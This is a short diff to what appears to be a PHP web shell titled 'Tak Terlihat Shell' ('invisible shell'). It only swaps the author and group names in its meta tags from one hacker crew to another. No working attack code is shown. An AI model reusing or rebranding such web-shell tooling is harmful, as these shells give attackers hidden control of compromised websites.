@@ -29,7 +29,7 @@ if(!($_SESSION['forbidden'])) {
 <html>
 <head>
 	<title>Tak Terlihat Shell</title>
-<meta charset="UTF-8"> <meta name="Author" content="Zildan-Sec" /> <meta name="copyright" content="|I<3U|" /<meta name="description" content="Cowok Tersakiti Team" />
+<meta charset="UTF-8"> <meta name="Author" content="./W4D3R 1337" /> <meta name="copyright" content="|I<3U|" /<meta name="description" content="Jawa Tengah Xploit" />
 </head>
 <style>
 	input { margin:0;background-color:#fff;border:1px solid #fff; }
